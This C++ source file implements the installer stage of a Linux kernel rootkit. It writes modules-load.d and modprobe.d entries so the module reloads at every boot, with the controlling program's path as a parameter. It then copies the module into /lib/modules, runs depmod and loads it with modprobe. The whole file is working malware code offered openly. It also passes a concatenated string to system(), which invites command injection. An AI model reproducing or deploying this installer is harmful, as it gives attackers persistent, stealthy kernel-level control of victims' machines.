#include "rootkit/RootkitInstaller.hpp"
#include "rootkit/issues/Logger.hpp"

#include <format>
#include <fstream>
#include <filesystem>
#include <cstdlib>

namespace fs = std::filesystem;

rootkit::RootkitInstaller::RootkitInstaller(
    const RtConfig& config,
    const issues::Logger& logger
)
    : config(config),
    error(logger)
{
    module_params = std::format("program_cwd={} program_path={}",
        config.program_cwd,
        config.program_path);
}

bool rootkit::RootkitInstaller::install() {
    if (!write_module_config())
        return false;

    if (!copy_module())
        return false;

    if (!update_module_database())
        return false;

    if (!load_module())
        return false;

    return true;
}

bool rootkit::RootkitInstaller::write_module_config() {
    std::vector<std::pair<std::string, std::string>> file_infos = {
        {
            "/etc/modules-load.d/" + config.module_name + ".conf",
            config.module_name
        },
        {
            "/etc/modprobe.d/" + config.module_name + ".conf",
            "options " + config.module_name + " " + module_params
        }
    };

    for (auto& file_info : file_infos) {
        const std::string& file_path = file_info.first;
        const std::string& content = file_info.second;

        try {
            // Create directory if it doesn't exist
            fs::create_directories(fs::path(file_path).parent_path());

            std::ofstream file(file_path);
            if (!file.is_open()) {
                error = std::format("Error: Cannot open config file at {}\n", file_path);
                return false;
            }

            file << content;
            file.close();
        } catch (const std::exception& e) {
            error = std::format("Error writing module config: {}\n", e.what());
            return false;
        }
    }

    return true;
}

bool rootkit::RootkitInstaller::copy_module() {
    try {
        std::string kernel_release = get_kernel_release();
        if (kernel_release.empty()) {
            error = "Error: Could not determine kernel release";
            return false;
        }

        std::string dest_dir = "/lib/modules/" + kernel_release + "/";
        fs::create_directories(dest_dir);

        // Copy module file
        std::string dest_path = dest_dir + fs::path(config.module_path).filename().string();
        fs::copy_file(config.module_path, dest_path, fs::copy_options::overwrite_existing);

        return true;
    } catch (const std::exception& e) {
        error = std::format("Error copying module: {}\n", e.what());
        return false;
    }
}

bool rootkit::RootkitInstaller::update_module_database() {
    try {
        int result = std::system("depmod -a");
        if (result == 0)
            return true;

        error = std::format("Error: depmod command failed with code {}\n", result);
        return false;
    } catch (const std::exception& e) {
        error = std::format("Error updating module database: {}\n", e.what());
        return false;
    }
}

bool rootkit::RootkitInstaller::load_module() {
    try {
        std::string command = "modprobe " + config.module_name;
        int result = std::system(command.c_str());
        if (result == 0)
            return true;

        error = std::format("Error: modprobe command failed with code {}\n", result);
        return false;
    } catch (const std::exception& e) {
        error = std::format("Error loading module: {}\n", e.what());
        return false;
    }
}

std::string rootkit::RootkitInstaller::get_kernel_release() {
    FILE* pipe = popen("uname -r", "r");
    if (!pipe) return "";

    // Read output of the command to res
    char buffer[128];
    std::string res;
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
        res += buffer;
    pclose(pipe);

    // Remove newline symbol
    if (!res.empty() && res.back() == '\n')
        res.pop_back();

    return res;
}
